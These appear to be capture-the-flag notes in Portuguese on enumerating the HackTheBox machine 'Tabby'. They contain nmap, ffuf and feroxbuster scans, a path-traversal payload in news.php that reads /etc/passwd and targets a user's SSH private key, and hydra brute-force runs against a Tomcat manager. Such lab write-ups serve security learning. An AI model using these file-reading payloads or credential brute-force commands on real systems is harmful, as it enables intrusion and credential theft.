Tabby
========================

## Enumeração

Como sempre, começamos com nmap:

    sudo nmap_enum tabby.htb
    


    
    sudo nmap -sS -p- -T5 --max-retries 0 -Pn tabby.htb

![qownnotes-media-GjOlwH](../../../media/qownnotes-media-GjOlwH.png)

    
    
    sudo nmap -sU -p 53,111,113,161,500,2049 tabby.htb
    
![qownnotes-media-ylsJza](../../../media/qownnotes-media-ylsJza.png)


### Enumeração HTTP (80)

Enumeração via URL brute force

    feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links -u http://megahosting.com


![qownnotes-media-qcEEoW](../../../media/qownnotes-media-qcEEoW.png)


Enumeração de subdomínio

    ffuf -u http://megahosting.htb -H "Host: FUZZ.megahosting.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 14175

![qownnotes-media-YJKfuc](../../../media/qownnotes-media-YJKfuc.png)

**Esse seria nosso entry point**

Nessa URL eu achei um LFI:

    firefox http://megahosting.htb/news.php?file=../../../../../etc/passwd

![qownnotes-media-FBVCcv](../../../media/qownnotes-media-FBVCcv.png)

Wordlists testadas:

    /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt

Payloads testados:


    ../../../../../../../../home/ash/.ssh/id_rsa
    

### Enumeração HTTP (8080)

Interface de gerenciamento

![qownnotes-media-gEdPBQ](../../../media/qownnotes-media-gEdPBQ.png)


Brute Force

    hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt megahosting.htb -s 8080 http-get /manager/html

Versão utilizada:

![qownnotes-media-naGuhN](../../../media/qownnotes-media-naGuhN.png)

    hydra -l ash -P tomcat_passwords.txt megahosting.htb -s 8080 http-get /manager/html

![qownnotes-media-WHsZoh](../../../media/qownnotes-media-WHsZoh.png)

Testando com extensões

    ffuf -c -ic -u http://megahosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e ".txt,.php,.html"

Novamente um brute force com wordlist custom

    cewl --with-numbers -m 3 http://megahosting.htb > usernames.txt
    cewl --with-numbers -m 3 http://megahosting.htb > passwords.txt

    hydra -l ash -P passwords.txt megahosting.htb -s 8080 http-get /manager/html

URL Brute force:

    ffuf -c -ic -u http://megahosting.com:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e ".txt,.php,.html"
    
![qownnotes-media-wzGAjI](../../../media/qownnotes-media-wzGAjI.png)
